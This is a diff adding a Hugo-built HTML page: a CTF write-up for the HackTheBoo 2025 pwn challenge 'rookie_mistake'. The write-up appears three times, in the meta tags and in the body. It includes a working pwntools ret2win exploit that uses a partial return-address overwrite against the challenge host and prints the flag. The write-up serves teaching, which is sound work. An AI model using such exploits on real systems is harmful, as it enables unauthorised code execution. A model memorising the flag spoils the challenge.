@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title> - CTF Writeups - moeve</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="▌ &mdash;
+▌ title: &ldquo;HackTheBoo 2025 - PWN - rookie_mistake&rdquo;
+▌ date: 2025-10-25
+▌ summary: &ldquo;HackTheBoo 2025 Pwn — rookie_mistake&rdquo;
+▌ description: &ldquo;Abusing a padding-only overflow to pivot main&rsquo;s return address onto the hidden win stub and pop a remote shell for the flag.&rdquo;
+▌ tags:
+▌   - HackTheBox
+▌   - HackTheBoo 2025
+▌   - Pwn
+▌   - ret2win
+▌   - x86_64
+▌ categories:
+▌   - HackTheBoo 2025
+▌   - Pwn
+▌ draft: false
+▌ &mdash;
+▌
+▌
+▌ ## Step 1: Explore the Challenge Files
+▌
+▌ Identify the provided artifacts and the binary format.
+▌
+▌ ▌ ls ▌ file rookie_mistake ▌ cat README.txt ▌
+▌
+▌ Findings:
+▌
+▌ - Single ELF named rookie_mistake, plus a themed README.
+▌ - 64-bit dynamically linked binary, no PIE, NX enabled, stack canary disabled, CET (IBT/SHSTK) on.
+▌
+▌ ## Step 2: Baseline Runtime Behavior
+▌
+▌ Observe how the binary interacts with stdin/stdout.
+▌
+▌ ▌ ./rookie_mistake ▌
+▌
+▌ Output snippet:
+▌
+▌ ▌ 【Gℓιт¢н Vσι¢є】Яοοқ... Μу ɓєℓονєɗ нυηтєя.. Aℓιgη тнє ¢οяєѕ.. Eѕ¢αρє! ▌ rook@ie:~$ 【Gℓιт¢н Vσι¢є】Шɨʟʟ ʏѳʋ ʍąŋąɠɛ ȶѳ ƈąʟʟ ȶнɛ ƈѳяɛ ąŋɗ ɛʂƈąքɛ?! ▌
+▌
+▌ Program reads from stdin once; any crash exits back to shell. No evidence of menuing or length checks—likely a single overflow.
+▌
+▌ ## Step 3: Static Recon
+▌
+▌ Use pwntools/objdump to enumerate symbols and key functions.
+▌
+▌ ▌ python3 - &lt;&lt;&#39;PY&#39; ▌ from pwn import * ▌ elf = ELF(&#39;rookie_mistake&#39;) ▌ print(&#39;main&#39;, hex(elf.symbols[&#39;main&#39;])) ▌ for name in (&#39;banner&#39;,&#39;check_core&#39;,&#39;overflow_core&#39;,&#39;fail&#39;,&#39;setup&#39;): ▌     func = elf.functions[name] ▌     print(f&quot;{name}@{hex(func.address)} size {func.size}&quot;) ▌ PY ▌
+▌
+▌ Highlights:
+▌
+▌ - main zeroes a 32-byte local buffer, prints ASCII art, then calls read(0, buf, 0x2e).
+▌ - check_core/overflow_core compare six global “core” slots against user input; failing invokes fail (prints scolding text).
+▌ - 0x401758 is a short stub that loads the string /bin/sh from .rodata and jumps to system@plt—classic win gadget.
+▌
+▌ strings confirms /bin/sh at 0x4030a7.
+▌
+▌ ## Step 4: Measure the Overflow
+▌
+▌ Inspect main’s prologue to confirm stack layout.
+▌
+▌ ▌ objdump -d rookie_mistake --start-address=0x40176b --stop-address=0x4017d6 ▌
+▌
+▌ Key instructions:
+▌
+▌ - sub rsp, 0x20 → local buffer is 0x20 bytes.
+▌ - After the read call there is no stack canary; returning uses the saved rbp/rip at offsets &#43;0x20 and &#43;0x28.
+▌
+▌ Therefore payload structure: [32 bytes padding][overwrite saved RBP][new RIP].
+▌
+▌ ## Step 5: Local Proof of Concept
+▌
+▌ Craft payload and run locally to ensure the jump hits system.
+▌
+▌ ▌ python3 - &lt;&lt;&#39;PY&#39; ▌ from pwn import * ▌ payload = b&#39;A&#39;*0x20 &#43; b&#39;B&#39;*8 &#43; p64(0x401758)[:6] ▌ proc = process(&#39;./rookie_mistake&#39;) ▌ proc.send(payload &#43; b&#39;id\n&#39;) ▌ print(proc.recvline()) ▌ PY ▌
+▌
+▌ Notes:
+▌
+▌ - CET rejects 8-byte gadgets lacking ENDBR64, so partial overwrite ([:6]) keeps high bytes intact and lands exactly on 0x401758 which begins with ENDBR.
+▌ - After ret, banner still prints due to buffered output; patience is required.
+▌
+▌ ## Step 6: Automate the Exploit
+▌
+▌ Create exploit.py with pwntools to attack both locally and remotely.
+▌
+▌ python ▌ #!/usr/bin/env python3 ▌ from pwn import * ▌ context.binary = ELF(&#39;./rookie_mistake&#39;) ▌ HOST, PORT = &#39;209.38.194.191&#39;, 30370 ▌ WIN = 0x401758 ▌ payload = b&#39;A&#39;*0x20 &#43; b&#39;B&#39;*8 &#43; p64(WIN)[:6] ▌ CMD = b&#39;cat flag.txt || cat /flag\n&#39; ▌ ▌ def main(): ▌     io = remote(HOST, PORT) ▌     io.send(payload) ▌     io.send(CMD) ▌     data = io.recvrepeat(0.5) ▌     print(data.decode(errors=&#39;ignore&#39;)) ▌ if __name__ == &#39;__main__&#39;: ▌     main() ▌ 
+▌
+▌ Tips:
+▌
+▌ - CET’s SHSTK/IBT do not hinder us because the entire gadget is legitimate compiled code.
+▌ - The slow, sleep-laden printstr routine means recvrepeat/timeouts must be generous.
+▌
+▌ ## Step 7: Pop the Remote Flag
+▌
+▌ Run the exploit against the challenge endpoint (network access required).
+▌
+▌ ▌ python3 exploit.py ▌
+▌
+▌ Relevant excerpt:
+▌
+▌ ▌ [*] Opening connection to 209.38.194.191 on port 30370: Done ▌ [*] Received 4146 bytes ▌ [&#43;] HTB{r3t2c0re_3sc4p3_th3_b1n4ry_9944a468344bd702fa436e27b18b3dd7} ▌
+▌
+▌ Saved locally via:
+▌
+▌ ▌ echo &#39;HTB{r3t2c0re_3sc4p3_th3_b1n4ry_9944a468344bd702fa436e27b18b3dd7}&#39; &gt; flag.txt ▌
+▌
+▌ ## Takeaways
+▌
+▌ - Non-PIE binary &#43; absent canary reduces exploit to straightforward ret2win despite CET being enabled.
+▌ - Slow-printing aesthetics can require relaxed timeouts when scripting.
+▌ - Partial-pointer overwrites remain handy for CET-hardened binaries where high bytes must remain canonical." />
+	<meta property="og:image" content=""/>
+	<script>
+	(function () {
+		var storageKey = 'theme';
+		var classList = document.documentElement.classList;
+		var storedTheme = null;
+		try {
+			storedTheme = window.localStorage.getItem(storageKey);
+		} catch (err) {
+			storedTheme = null;
+		}
+		var prefersDark = false;
+		try {
+			prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
+		} catch (err) {
+			prefersDark = false;
+		}
+		var theme = (storedTheme === 'dark' || storedTheme === 'light') ? storedTheme : (prefersDark ? 'dark' : 'light');
+		if (theme === 'dark') {
+			classList.add('dark');
+		} else {
+			classList.remove('dark');
+		}
+	})();
+	</script>
+	<script type="module" src="http://localhost:1313/js/theme-toggle.js" defer></script>
+	<meta property="og:url" content="http://localhost:1313/writeups/writeups/">
+  <meta property="og:site_name" content="CTF Writeups - moeve">
+  <meta property="og:title" content="CTF Writeups - moeve">
+  <meta property="og:description" content="▌ — ▌ title: “HackTheBoo 2025 - PWN - rookie_mistake” ▌ date: 2025-10-25 ▌ summary: “HackTheBoo 2025 Pwn — rookie_mistake” ▌ description: “Abusing a padding-only overflow to pivot main’s return address onto the hidden win stub and pop a remote shell for the flag.” ▌ tags: ▌ - HackTheBox ▌ - HackTheBoo 2025 ▌ - Pwn ▌ - ret2win ▌ - x86_64 ▌ categories: ▌ - HackTheBoo 2025 ▌ - Pwn ▌ draft: false ▌ — ▌ ▌ ▌ ## Step 1: Explore the Challenge Files ▌ ▌ Identify the provided artifacts and the binary format. ▌ ▌ ▌ ls ▌ file rookie_mistake ▌ cat README.txt ▌ ▌ ▌ Findings: ▌ ▌ - Single ELF named rookie_mistake, plus a themed README. ▌ - 64-bit dynamically linked binary, no PIE, NX enabled, stack canary disabled, CET (IBT/SHSTK) on. ▌ ▌ ## Step 2: Baseline Runtime Behavior ▌ ▌ Observe how the binary interacts with stdin/stdout. ▌ ▌ ▌ ./rookie_mistake ▌ ▌ ▌ Output snippet: ▌ ▌ ▌ 【Gℓιт¢н Vσι¢є】Яοοқ... Μу ɓєℓονєɗ нυηтєя.. Aℓιgη тнє ¢οяєѕ.. Eѕ¢αρє! ▌ rook@ie:~$ 【Gℓιт¢н Vσι¢є】Шɨʟʟ ʏѳʋ ʍąŋąɠɛ ȶѳ ƈąʟʟ ȶнɛ ƈѳяɛ ąŋɗ ɛʂƈąքɛ?! ▌ ▌ ▌ Program reads from stdin once; any crash exits back to shell. No evidence of menuing or length checks—likely a single overflow. ▌ ▌ ## Step 3: Static Recon ▌ ▌ Use pwntools/objdump to enumerate symbols and key functions. ▌ ▌ ▌ python3 - &lt;&lt;&#39;PY&#39; ▌ from pwn import * ▌ elf = ELF(&#39;rookie_mistake&#39;) ▌ print(&#39;main&#39;, hex(elf.symbols[&#39;main&#39;])) ▌ for name in (&#39;banner&#39;,&#39;check_core&#39;,&#39;overflow_core&#39;,&#39;fail&#39;,&#39;setup&#39;): ▌ func = elf.functions[name] ▌ print(f&#34;{name}@{hex(func.address)} size {func.size}&#34;) ▌ PY ▌ ▌ ▌ Highlights: ▌ ▌ - main zeroes a 32-byte local buffer, prints ASCII art, then calls read(0, buf, 0x2e). ▌ - check_core/overflow_core compare six global “core” slots against user input; failing invokes fail (prints scolding text). ▌ - 0x401758 is a short stub that loads the string /bin/sh from .rodata and jumps to system@plt—classic win gadget. ▌ ▌ strings confirms /bin/sh at 0x4030a7. ▌ ▌ ## Step 4: Measure the Overflow ▌ ▌ Inspect main’s prologue to confirm stack layout. ▌ ▌ ▌ objdump -d rookie_mistake --start-address=0x40176b --stop-address=0x4017d6 ▌ ▌ ▌ Key instructions: ▌ ▌ - sub rsp, 0x20 → local buffer is 0x20 bytes. ▌ - After the read call there is no stack canary; returning uses the saved rbp/rip at offsets &#43;0x20 and &#43;0x28. ▌ ▌ Therefore payload structure: [32 bytes padding][overwrite saved RBP][new RIP]. ▌ ▌ ## Step 5: Local Proof of Concept ▌ ▌ Craft payload and run locally to ensure the jump hits system. ▌ ▌ ▌ python3 - &lt;&lt;&#39;PY&#39; ▌ from pwn import * ▌ payload = b&#39;A&#39;*0x20 &#43; b&#39;B&#39;*8 &#43; p64(0x401758)[:6] ▌ proc = process(&#39;./rookie_mistake&#39;) ▌ proc.send(payload &#43; b&#39;id\n&#39;) ▌ print(proc.recvline()) ▌ PY ▌ ▌ ▌ Notes: ▌ ▌ - CET rejects 8-byte gadgets lacking ENDBR64, so partial overwrite ([:6]) keeps high bytes intact and lands exactly on 0x401758 which begins with ENDBR. ▌ - After ret, banner still prints due to buffered output; patience is required. ▌ ▌ ## Step 6: Automate the Exploit ▌ ▌ Create exploit.py with pwntools to attack both locally and remotely. ▌ ▌ python ▌ #!/usr/bin/env python3 ▌ from pwn import * ▌ context.binary = ELF(&#39;./rookie_mistake&#39;) ▌ HOST, PORT = &#39;209.38.194.191&#39;, 30370 ▌ WIN = 0x401758 ▌ payload = b&#39;A&#39;*0x20 &#43; b&#39;B&#39;*8 &#43; p64(WIN)[:6] ▌ CMD = b&#39;cat flag.txt || cat /flag\n&#39; ▌ ▌ def main(): ▌ io = remote(HOST, PORT) ▌ io.send(payload) ▌ io.send(CMD) ▌ data = io.recvrepeat(0.5) ▌ print(data.decode(errors=&#39;ignore&#39;)) ▌ if __name__ == &#39;__main__&#39;: ▌ main() ▌ ▌ ▌ Tips: ▌ ▌ - CET’s SHSTK/IBT do not hinder us because the entire gadget is legitimate compiled code. ▌ - The slow, sleep-laden printstr routine means recvrepeat/timeouts must be generous. ▌ ▌ ## Step 7: Pop the Remote Flag ▌ ▌ Run the exploit against the challenge endpoint (network access required). ▌ ▌ ▌ python3 exploit.py ▌ ▌ ▌ Relevant excerpt: ▌ ▌ ▌ [*] Opening connection to 209.38.194.191 on port 30370: Done ▌ [*] Received 4146 bytes ▌ [&#43;] HTB{r3t2c0re_3sc4p3_th3_b1n4ry_9944a468344bd702fa436e27b18b3dd7} ▌ ▌ ▌ Saved locally via: ▌ ▌ ▌ echo &#39;HTB{r3t2c0re_3sc4p3_th3_b1n4ry_9944a468344bd702fa436e27b18b3dd7}&#39; &gt; flag.txt ▌ ▌ ▌ ## Takeaways ▌ ▌ - Non-PIE binary &#43; absent canary reduces exploit to straightforward ret2win despite CET being enabled. ▌ - Slow-printing aesthetics can require relaxed timeouts when scripting. ▌ - Partial-pointer overwrites remain handy for CET-hardened binaries where high bytes must remain canonical.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="CTF Writeups - moeve">
+  <meta name="twitter:description" content="▌ — ▌ title: “HackTheBoo 2025 - PWN - rookie_mistake” ▌ date: 2025-10-25 ▌ summary: “HackTheBoo 2025 Pwn — rookie_mistake” ▌ description: “Abusing a padding-only overflow to pivot main’s return address onto the hidden win stub and pop a remote shell for the flag.” ▌ tags: ▌ - HackTheBox ▌ - HackTheBoo 2025 ▌ - Pwn ▌ - ret2win ▌ - x86_64 ▌ categories: ▌ - HackTheBoo 2025 ▌ - Pwn ▌ draft: false ▌ — ▌ ▌ ▌ ## Step 1: Explore the Challenge Files ▌ ▌ Identify the provided artifacts and the binary format. ▌ ▌ ▌ ls ▌ file rookie_mistake ▌ cat README.txt ▌ ▌ ▌ Findings: ▌ ▌ - Single ELF named rookie_mistake, plus a themed README. ▌ - 64-bit dynamically linked binary, no PIE, NX enabled, stack canary disabled, CET (IBT/SHSTK) on. ▌ ▌ ## Step 2: Baseline Runtime Behavior ▌ ▌ Observe how the binary interacts with stdin/stdout. ▌ ▌ ▌ ./rookie_mistake ▌ ▌ ▌ Output snippet: ▌ ▌ ▌ 【Gℓιт¢н Vσι¢є】Яοοқ... Μу ɓєℓονєɗ нυηтєя.. Aℓιgη тнє ¢οяєѕ.. Eѕ¢αρє! ▌ rook@ie:~$ 【Gℓιт¢н Vσι¢є】Шɨʟʟ ʏѳʋ ʍąŋąɠɛ ȶѳ ƈąʟʟ ȶнɛ ƈѳяɛ ąŋɗ ɛʂƈąքɛ?! ▌ ▌ ▌ Program reads from stdin once; any crash exits back to shell. No evidence of menuing or length checks—likely a single overflow. ▌ ▌ ## Step 3: Static Recon ▌ ▌ Use pwntools/objdump to enumerate symbols and key functions. ▌ ▌ ▌ python3 - &lt;&lt;&#39;PY&#39; ▌ from pwn import * ▌ elf = ELF(&#39;rookie_mistake&#39;) ▌ print(&#39;main&#39;, hex(elf.symbols[&#39;main&#39;])) ▌ for name in (&#39;banner&#39;,&#39;check_core&#39;,&#39;overflow_core&#39;,&#39;fail&#39;,&#39;setup&#39;): ▌ func = elf.functions[name] ▌ print(f&#34;{name}@{hex(func.address)} size {func.size}&#34;) ▌ PY ▌ ▌ ▌ Highlights: ▌ ▌ - main zeroes a 32-byte local buffer, prints ASCII art, then calls read(0, buf, 0x2e). ▌ - check_core/overflow_core compare six global “core” slots against user input; failing invokes fail (prints scolding text). ▌ - 0x401758 is a short stub that loads the string /bin/sh from .rodata and jumps to system@plt—classic win gadget. ▌ ▌ strings confirms /bin/sh at 0x4030a7. ▌ ▌ ## Step 4: Measure the Overflow ▌ ▌ Inspect main’s prologue to confirm stack layout. ▌ ▌ ▌ objdump -d rookie_mistake --start-address=0x40176b --stop-address=0x4017d6 ▌ ▌ ▌ Key instructions: ▌ ▌ - sub rsp, 0x20 → local buffer is 0x20 bytes. ▌ - After the read call there is no stack canary; returning uses the saved rbp/rip at offsets &#43;0x20 and &#43;0x28. ▌ ▌ Therefore payload structure: [32 bytes padding][overwrite saved RBP][new RIP]. ▌ ▌ ## Step 5: Local Proof of Concept ▌ ▌ Craft payload and run locally to ensure the jump hits system. ▌ ▌ ▌ python3 - &lt;&lt;&#39;PY&#39; ▌ from pwn import * ▌ payload = b&#39;A&#39;*0x20 &#43; b&#39;B&#39;*8 &#43; p64(0x401758)[:6] ▌ proc = process(&#39;./rookie_mistake&#39;) ▌ proc.send(payload &#43; b&#39;id\n&#39;) ▌ print(proc.recvline()) ▌ PY ▌ ▌ ▌ Notes: ▌ ▌ - CET rejects 8-byte gadgets lacking ENDBR64, so partial overwrite ([:6]) keeps high bytes intact and lands exactly on 0x401758 which begins with ENDBR. ▌ - After ret, banner still prints due to buffered output; patience is required. ▌ ▌ ## Step 6: Automate the Exploit ▌ ▌ Create exploit.py with pwntools to attack both locally and remotely. ▌ ▌ python ▌ #!/usr/bin/env python3 ▌ from pwn import * ▌ context.binary = ELF(&#39;./rookie_mistake&#39;) ▌ HOST, PORT = &#39;209.38.194.191&#39;, 30370 ▌ WIN = 0x401758 ▌ payload = b&#39;A&#39;*0x20 &#43; b&#39;B&#39;*8 &#43; p64(WIN)[:6] ▌ CMD = b&#39;cat flag.txt || cat /flag\n&#39; ▌ ▌ def main(): ▌ io = remote(HOST, PORT) ▌ io.send(payload) ▌ io.send(CMD) ▌ data = io.recvrepeat(0.5) ▌ print(data.decode(errors=&#39;ignore&#39;)) ▌ if __name__ == &#39;__main__&#39;: ▌ main() ▌ ▌ ▌ Tips: ▌ ▌ - CET’s SHSTK/IBT do not hinder us because the entire gadget is legitimate compiled code. ▌ - The slow, sleep-laden printstr routine means recvrepeat/timeouts must be generous. ▌ ▌ ## Step 7: Pop the Remote Flag ▌ ▌ Run the exploit against the challenge endpoint (network access required). ▌ ▌ ▌ python3 exploit.py ▌ ▌ ▌ Relevant excerpt: ▌ ▌ ▌ [*] Opening connection to 209.38.194.191 on port 30370: Done ▌ [*] Received 4146 bytes ▌ [&#43;] HTB{r3t2c0re_3sc4p3_th3_b1n4ry_9944a468344bd702fa436e27b18b3dd7} ▌ ▌ ▌ Saved locally via: ▌ ▌ ▌ echo &#39;HTB{r3t2c0re_3sc4p3_th3_b1n4ry_9944a468344bd702fa436e27b18b3dd7}&#39; &gt; flag.txt ▌ ▌ ▌ ## Takeaways ▌ ▌ - Non-PIE binary &#43; absent canary reduces exploit to straightforward ret2win despite CET being enabled. ▌ - Slow-printing aesthetics can require relaxed timeouts when scripting. ▌ - Partial-pointer overwrites remain handy for CET-hardened binaries where high bytes must remain canonical.">
+
+        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.7a5c05040394322612a2d98397e9932aa81d9d7acc70199463e79f8180c8e0c0.css" />
+		
+		
+		<link rel="stylesheet" type="text/css" href="http://localhost:1313/css/custom.535853847a8ed6c67233358025750e016790cf7cc85b98d166a4d79e2db3beb9.css">
+		
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:1313/">CTF Writeups - moeve</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/writeups/">Writeups</a>
+		
+		<a href="/tags/">Tags</a>
+		
+		<button id="theme-toggle" class="theme-toggle" type="button" aria-label="Switch to dark mode" aria-pressed="false">
+			<svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+				<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+			</svg>
+			<svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+				<circle cx="12" cy="12" r="5"></circle>
+				<line x1="12" y1="1" x2="12" y2="3"></line>
+				<line x1="12" y1="21" x2="12" y2="23"></line>
+				<line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+				<line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+				<line x1="1" y1="12" x2="3" y2="12"></line>
+				<line x1="21" y1="12" x2="23" y2="12"></line>
+				<line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+				<line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+			</svg>
+		</button>
+	</nav>
+</header>
+
+<main>
+  <article>
+    <div class="post-container">
+      
+      <div class="post-content">
+        <div class="title">
+          <h1 class="title"></h1>
+          <div class="meta">Posted on Jan 1, 1</div>
+        </div>
+        
+        <section class="body">
+          <p>▌ &mdash;
+▌ title: &ldquo;HackTheBoo 2025 - PWN - rookie_mistake&rdquo;
+▌ date: 2025-10-25
+▌ summary: &ldquo;HackTheBoo 2025 Pwn — rookie_mistake&rdquo;
+▌ description: &ldquo;Abusing a padding-only overflow to pivot main&rsquo;s return address onto the hidden win stub and pop a remote shell for the flag.&rdquo;
+▌ tags:
+▌   - HackTheBox
+▌   - HackTheBoo 2025
+▌   - Pwn
+▌   - ret2win
+▌   - x86_64
+▌ categories:
+▌   - HackTheBoo 2025
+▌   - Pwn
+▌ draft: false
+▌ &mdash;
+▌
+▌
+▌ ## Step 1: Explore the Challenge Files
+▌
+▌ Identify the provided artifacts and the binary format.
+▌
+▌ <code>▌ ls ▌ file rookie_mistake ▌ cat README.txt ▌</code>
+▌
+▌ Findings:
+▌
+▌ - Single ELF named <code>rookie_mistake</code>, plus a themed README.
+▌ - 64-bit dynamically linked binary, <strong>no PIE</strong>, <strong>NX enabled</strong>, <strong>stack canary disabled</strong>, CET (IBT/SHSTK) on.
+▌
+▌ ## Step 2: Baseline Runtime Behavior
+▌
+▌ Observe how the binary interacts with stdin/stdout.
+▌
+▌ <code>▌ ./rookie_mistake ▌</code>
+▌
+▌ Output snippet:
+▌
+▌ <code>▌ 【Gℓιт¢н Vσι¢є】Яοοқ... Μу ɓєℓονєɗ нυηтєя.. Aℓιgη тнє ¢οяєѕ.. Eѕ¢αρє! ▌ rook@ie:~$ 【Gℓιт¢н Vσι¢є】Шɨʟʟ ʏѳʋ ʍąŋąɠɛ ȶѳ ƈąʟʟ ȶнɛ ƈѳяɛ ąŋɗ ɛʂƈąքɛ?! ▌</code>
+▌
+▌ Program reads from stdin once; any crash exits back to shell. No evidence of menuing or length checks—likely a single overflow.
+▌
+▌ ## Step 3: Static Recon
+▌
+▌ Use pwntools/objdump to enumerate symbols and key functions.
+▌
+▌ <code>▌ python3 - &lt;&lt;'PY' ▌ from pwn import * ▌ elf = ELF('rookie_mistake') ▌ print('main', hex(elf.symbols['main'])) ▌ for name in ('banner','check_core','overflow_core','fail','setup'): ▌     func = elf.functions[name] ▌     print(f&quot;{name}@{hex(func.address)} size {func.size}&quot;) ▌ PY ▌</code>
+▌
+▌ Highlights:
+▌
+▌ - <code>main</code> zeroes a 32-byte local buffer, prints ASCII art, then calls <code>read(0, buf, 0x2e)</code>.
+▌ - <code>check_core</code>/<code>overflow_core</code> compare six global “core” slots against user input; failing invokes <code>fail</code> (prints scolding text).
+▌ - <code>0x401758</code> is a short stub that loads the string <code>/bin/sh</code> from <code>.rodata</code> and jumps to <code>system@plt</code>—classic <code>win</code> gadget.
+▌
+▌ <code>strings</code> confirms <code>/bin/sh</code> at <code>0x4030a7</code>.
+▌
+▌ ## Step 4: Measure the Overflow
+▌
+▌ Inspect <code>main</code>’s prologue to confirm stack layout.
+▌
+▌ <code>▌ objdump -d rookie_mistake --start-address=0x40176b --stop-address=0x4017d6 ▌</code>
+▌
+▌ Key instructions:
+▌
+▌ - <code>sub rsp, 0x20</code> → local buffer is 0x20 bytes.
+▌ - After the <code>read</code> call there is no stack canary; returning uses the saved <code>rbp</code>/<code>rip</code> at offsets <code>+0x20</code> and <code>+0x28</code>.
+▌
+▌ Therefore payload structure: <code>[32 bytes padding][overwrite saved RBP][new RIP]</code>.
+▌
+▌ ## Step 5: Local Proof of Concept
+▌
+▌ Craft payload and run locally to ensure the jump hits <code>system</code>.
+▌
+▌ <code>▌ python3 - &lt;&lt;'PY' ▌ from pwn import * ▌ payload = b'A'*0x20 + b'B'*8 + p64(0x401758)[:6] ▌ proc = process('./rookie_mistake') ▌ proc.send(payload + b'id\n') ▌ print(proc.recvline()) ▌ PY ▌</code>
+▌
+▌ Notes:
+▌
+▌ - CET rejects 8-byte gadgets lacking ENDBR64, so partial overwrite (<code>[:6]</code>) keeps high bytes intact and lands exactly on <code>0x401758</code> which begins with ENDBR.
+▌ - After ret, banner still prints due to buffered output; patience is required.
+▌
+▌ ## Step 6: Automate the Exploit
+▌
+▌ Create <code>exploit.py</code> with pwntools to attack both locally and remotely.
+▌
+▌ <code>python ▌ #!/usr/bin/env python3 ▌ from pwn import * ▌ context.binary = ELF('./rookie_mistake') ▌ HOST, PORT = '209.38.194.191', 30370 ▌ WIN = 0x401758 ▌ payload = b'A'*0x20 + b'B'*8 + p64(WIN)[:6] ▌ CMD = b'cat flag.txt || cat /flag\n' ▌ ▌ def main(): ▌     io = remote(HOST, PORT) ▌     io.send(payload) ▌     io.send(CMD) ▌     data = io.recvrepeat(0.5) ▌     print(data.decode(errors='ignore')) ▌ if __name__ == '__main__': ▌     main() ▌ </code>
+▌
+▌ Tips:
+▌
+▌ - CET’s SHSTK/IBT do not hinder us because the entire gadget is legitimate compiled code.
+▌ - The slow, sleep-laden <code>printstr</code> routine means <code>recvrepeat</code>/timeouts must be generous.
+▌
+▌ ## Step 7: Pop the Remote Flag
+▌
+▌ Run the exploit against the challenge endpoint (network access required).
+▌
+▌ <code>▌ python3 exploit.py ▌</code>
+▌
+▌ Relevant excerpt:
+▌
+▌ <code>▌ [*] Opening connection to 209.38.194.191 on port 30370: Done ▌ [*] Received 4146 bytes ▌ [+] HTB{r3t2c0re_3sc4p3_th3_b1n4ry_9944a468344bd702fa436e27b18b3dd7} ▌</code>
+▌
+▌ Saved locally via:
+▌
+▌ <code>▌ echo 'HTB{r3t2c0re_3sc4p3_th3_b1n4ry_9944a468344bd702fa436e27b18b3dd7}' &gt; flag.txt ▌</code>
+▌
+▌ ## Takeaways
+▌
+▌ - Non-PIE binary + absent canary reduces exploit to straightforward ret2win despite CET being enabled.
+▌ - Slow-printing aesthetics can require relaxed timeouts when scripting.
+▌ - Partial-pointer overwrites remain handy for CET-hardened binaries where high bytes must remain canonical.</p>
+
+        </section>
+        <div class="post-tags">
+          
+          
+          
+        </div>
+      </div>
+
+      
+      
+    </div>
+
+    </article>
+</main>
+<footer>
+  <div style="display:flex"></div>
+  <div class="footer-info">
+    2025  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+
+</div>
+    </body>
+</html>
